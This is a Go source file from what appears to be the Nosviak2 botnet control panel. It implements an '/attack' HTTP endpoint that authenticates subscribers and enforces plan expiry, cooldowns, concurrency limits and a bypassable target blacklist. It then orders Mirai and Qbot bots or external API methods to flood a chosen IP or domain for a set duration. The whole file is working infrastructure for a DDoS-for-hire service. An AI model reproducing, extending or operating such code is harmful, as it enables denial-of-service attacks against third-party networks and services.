package apis

import (
	attacks "Nosviak2/core/attack"
	"Nosviak2/core/database"
	"Nosviak2/core/slaves/fakes"
	"Nosviak2/core/slaves/mirai"
	"Nosviak2/core/slaves/propagation"
	"Nosviak2/core/slaves/qbot"
	"Nosviak2/core/sources/events"
	"Nosviak2/core/sources/layouts/toml"
	"Nosviak2/core/sources/ranks"
	"net/http"
	"strconv"
	"strings"
	"time"
)

// what we will return on attacks
// this will return on the `/attack` path and stores information
type LaunchResult struct {
	Success    bool   `json:"message"`     //if attack has been sent
	ErrorRes   string `json:"error"`       //stores the error from attack
	AuthMethod string `json:"auth_method"` //either `token` or `user&pass`
	Username   string `json:"username"`    //the current username being used
	Target     string `json:"target"`      //stores the attacks target to send to
	Port       int    `json:"port"`        //stores the attacks port to send towards
	Duration   int    `json:"duration"`    //stores the attacks duration to send for
	Method     string `json:"method"`      //stores the method which the attack will send with
	AllSlaves  int    `json:"slaves"`      //stores all slaves which the attack was sent with properly
	AttackType string `json:"attack_type"` //stores the current methods type and displays inside the system args
}

// attack will launch an attack from a users profile properly
// this will allow the system to handle the attacks via apis if they have the rank
// format 1: http://localhost:8080/attack?username=[USERNAME]&password=[PASSWORD]&target=[TARGET]&port=[PORT]&duration=[DURATION]&method=[METHOD]
// format 2: http://localhost:8080/attack?token=[TOKEN]&target=[TARGET]&port=[PORT]&duration=[DURATION]&method=[METHOD]
func Attack(w http.ResponseWriter, r *http.Request) {

	//launchs the debug message properly
	events.DebugLaunch(events.Functioning, "API", "REQUEST", []string{r.RemoteAddr, r.URL.String(), "/attack"})

	//checks for disabled api attacks
	if !attacks.APIAttacksEnabled || !attacks.AttacksEnabled {
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"ATTACK-DISABLED", r.RemoteAddr, r.URL.String(), "/attack"})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrAPIAttacksDisabled.Error(), AuthMethod: "EOF"}, w)
		return
	}

	authenticationMethod := 0 //default is set to 0
	if r.URL.Query().Has("username") && r.URL.Query().Has("password") {
		authenticationMethod = 1 //username & password auth method
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"USER&PASS-AUTH", r.RemoteAddr, r.URL.String(), "/attack"})
	} else if r.URL.Query().Has("key") {
		authenticationMethod = 2 //token auth method
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"TOKEN-AUTH", r.RemoteAddr, r.URL.String(), "/attack"})
	} else { //the unknown authentication method will be written here
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"UNWANTED-AUTH", r.RemoteAddr, r.URL.String(), "/attack"})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUnwantedAuthMethod.Error(), AuthMethod: "EOF"}, w)
		return
	}

	var user *database.User = nil //the users information for the attack

	if authenticationMethod == 1 { //username & password based authentication method
		//tries to get the username which was given from the database
		has, err := database.Conn.FindUser(r.URL.Query().Get("username"))
		if err != nil || has == nil { //unknown username has been given or database returned error
			events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"UNKNOWN-USER-GIVEN", r.RemoteAddr, r.URL.String(), "/attack"})
			EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUnknownUserGiven.Error(), AuthMethod: "user&pass"}, w)
			return
		}

		user = has //updates the option
	} else if authenticationMethod == 2 { //auth via token
		//tries to get the user via there api token
		has, err := database.Conn.GetUserViaToken(r.URL.Query().Get("key"))
		if err != nil || has == nil { //unknown token has been given or database returned error
			events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"UNKNOWN-TOKEN-GIVEN", r.RemoteAddr, r.URL.String(), "/attack"})
			EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUnknownToken.Error(), AuthMethod: "token"}, w)
			return
		}

		user = has //updates the option
	}

	if authenticationMethod == 1 && user.Password != database.HashProduct(r.URL.Query().Get("password")) { //password authentication method
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"UNKNOWN-PASSWORD-GIVEN", r.RemoteAddr, r.URL.String(), "/attack"})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUnknownPassword.Error(), AuthMethod: "user&pass", Username: user.Username}, w)
		return
	} else if authenticationMethod == 2 && user.Token != database.HashProduct(r.URL.Query().Get("key")) {
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"UNKNOWN-TOKEN-GIVEN", r.RemoteAddr, r.URL.String(), "/attack"})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUnknownToken.Error(), AuthMethod: "token", Username: user.Username}, w)
		return
	}

	RankNetwork := ranks.MakeRank(user.Username)
	if err := RankNetwork.SyncWithString(user.Ranks); err != nil {
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"UNKNOWN-RANK-ERROR", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUnknownError.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
		return
	}

	//checks for expired systems properly
	if user.Expiry <= time.Now().Unix() { //checks for expired account which are trying to send properly
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"PLAN-EXPIRED", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrPlanExpired.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
		return
	}

	if !RankNetwork.CanAccess("api") { //cant access the api system
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"ACCESS-DENIED", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrCantAccess.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
		return
	}

	//tries to check the syntax of information given within the request
	if !r.URL.Query().Has("target") || !r.URL.Query().Has("duration") || !r.URL.Query().Has("port") || !r.URL.Query().Has("method") {
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"MISSING-QUERYS", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrMissingQueryError.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
		return
	}

	//tries to check for the method being valid, this will also allow the usage for safe use of the prefix within the attacks
	method := attacks.QueryMethod(strings.Replace(strings.ToLower(r.URL.Query().Get("method")), toml.AttacksToml.Attacks.Prefix, "", -1))
	if method == nil || len(method.Permissions) > 0 && !RankNetwork.CanAccessArray(method.Permissions) { //checks permissions and if method was found
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"PERMISSIONS-MISSING/UNKNOWN-METHOD", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUnknownMethod.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
		return
	}

	//invalid target prompt is alerted here properly
	if !attacks.IsIP(r.URL.Query().Get("target")) && !attacks.IsDomain(r.URL.Query().Get("target")) {
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"INVALID-TARGET", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrInvalidTarget.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
		return
	}

	if !RankNetwork.CanAccess("bypass-bl") { //checks if they can bypass the blacklist
		IsBlacklisted, err := attacks.CheckBlacklist(r.URL.Query().Get("target"))
		if err != nil || IsBlacklisted { //checks if the host is blacklisted or not properly
			events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"TARGET-BLACKLISTED", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
			EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrTargetBlacklisted.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
			return
		}
	}

	//will try to parse the port input given properly
	Port, err := strconv.Atoi(r.URL.Query().Get("port"))
	if err != nil || Port < 0 || Port > 65535 { //tries to validate port
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"INVALID-PORT", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrInvalidPort.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
		return
	}

	//tries to find the group in statement
	Group := attacks.FindGroup(method) //looks for group

	//will try to parse the duration given properly inside args
	Duration, err := strconv.Atoi(r.URL.Query().Get("duration")) //tries to validate the maxtime input within the statement
	if err != nil || method.Options.MaxTimeOverride > 0 && Duration > method.Options.MaxTimeOverride || method.Options.EnMaxtime <= 0 && Duration > user.MaxTime && user.MaxTime != 0 || method.Options.EnMaxtime > 0 && Duration > method.Options.EnMaxtime || Group != nil && Group.MaxTime < Duration {
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"DURATION-INVALID", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrInvalidDuration.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
		return
	}

	//cant bypass powersaving mode
	if !RankNetwork.CanAccess("bypass_ps") { //powersaving
		//checks for running attacks within database
		running, err := database.Conn.AttackingTarget(r.URL.Query().Get("target"))
		if err != nil || len(running) >= 1 { //checks for running
			events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"POWERSAVING-ALERT", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
			EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrTargetAlreadyUnderAttack.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
			return
		}
	}

	//Attacking gets all of a users ongoing attacks
	MyAttacks, err := database.Conn.Attacking(user.Username)
	if err != nil { //unknown error has happened
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"RUNNING-DATABASE-FAULT", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUnknownError.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
		return
	}

	if len(MyAttacks) > 0 { //checks for running attacks

		//checks the concurrent system properly and safely
		if user.Concurrents < len(MyAttacks) { //checks conn limit reached
			events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"CONCURRENT-LIMIT-REACHED", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
			EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrConnLimitReached.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
			return
		}

		//stores most recent attack hopefully
		var recent *database.AttackLinear = &MyAttacks[0]

		//ranges through attacks properly
		for _, attack := range MyAttacks {
			if attack.Created > recent.Created {
				recent = &attack //updates attack
			}
		}

		//checks the users cooldown mode is active or not properly and safely
		if !method.Options.CooldownBypass && recent.Created+int64(user.Cooldown) > time.Now().Unix() && user.Cooldown > 0 {
			events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"IN-COOLDOWN", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
			EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrInCooldown.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
			return
		}
	}

	//checks for the attack within the guidelines of the network
	withMethod, err := database.Conn.AttackingWithMethod(user.Username, strings.ToLower(r.URL.Query().Get("method")))
	if err != nil || method.Options.GlobalPerUser > 0 && len(withMethod) > method.Options.GlobalPerUser {
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"METHOD-RUNNING-LIMIT-REACHED", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrUserLimitReached.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
		return
	}

	//stores all the attack keyvalue flags within the system
	var flags map[string]*attacks.KeyValue = make(map[string]*attacks.KeyValue)
	if valid, err := attacks.VerifyInformation(flags, method, nil); !valid || err != nil {
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"VERIFY-FLAGS-FAULT", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrKeyValueFault.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
		return
	}

	var (
		launched bool  = false                                                        //stores if the attack has been launched
		created  int64 = time.Now().Unix()                                            //when attack was created proeprly
		finished int64 = time.Now().Add(time.Duration(Duration) * time.Second).Unix() //when the attack will expiy
	)

	var TypeString string
	switch method.Type { //switchs the system information properly

	case 1: //api method
		TypeString = "api"
		err = attacks.LaunchAttack(&method.ApiInterface, r.URL.Query().Get("target"), r.URL.Query().Get("port"), r.URL.Query().Get("duration"), flags, user.Username)
		if err == nil {
			launched = true
		} //checks the launched boolean if sent within guidelines of error
	case 2: //mirai method
		TypeString = "mirai"
		launched, err = attacks.NewMiraiAttack(r.URL.Query().Get("target"), Duration, Port, method, nil, flags)
	case 3: //qbot method
		TypeString = "qbot"
		launched, err = attacks.LaunchQbot(strings.Split(strings.ToLower(r.URL.Query().Get("method"))+" "+r.URL.Query().Get("target")+" "+r.URL.Query().Get("duration")+" "+r.URL.Query().Get("port"), " "), method, nil)
	}

	if !launched || err != nil { //checks if the attack has been sent correctly or not
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"CANT-LAUNCH", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrAttackLaunchFault.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
		return
	}

	//default type alert founded
	if len(toml.ApiToml.API.DType) > 0 {
		TypeString = toml.ApiToml.API.DType
	}

	//tries to log the attack into the database properly and safely
	if err := database.Conn.PushAttack(&database.AttackLinear{Method: strings.ToLower(r.URL.Query().Get("method")), Target: r.URL.Query().Get("target"), Username: user.Username, Duration: Duration, Port: Port, Created: created, Finish: finished, SentViaAPI: true}); err != nil {
		events.DebugLaunch(events.FunctionWithError, "API", "REQUEST", []string{"DATABASE-CANT-LOG", r.RemoteAddr, r.URL.String(), "/attack", user.Username})
		EncodeAndReturn(LaunchResult{Success: false, ErrorRes: ErrAttackLaunchFault.Error(), AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username}, w)
		return
	}

	//checks for debug mode within the attacks
	events.DebugLaunch(events.Functioning, "API", "REQUEST", []string{"ATTACK-LAUNCHED-TOWARDS-TARGET", r.RemoteAddr, r.URL.String(), "/attack", user.Username})

	//logs to the session that the attack has been launched properly
	EncodeAndReturn(LaunchResult{Success: true, ErrorRes: "attack has been launched correctly", AuthMethod: AuthMethodToString(authenticationMethod), Username: user.Username, Target: r.URL.Query().Get("target"), Port: Port, Duration: Duration, Method: strings.ToLower(r.URL.Query().Get("method")), AllSlaves: len(mirai.MiraiSlaves.All) + len(qbot.QbotClients) + propagation.AllSlaves(0) + fakes.AllFakes(0), AttackType: TypeString}, w)
}
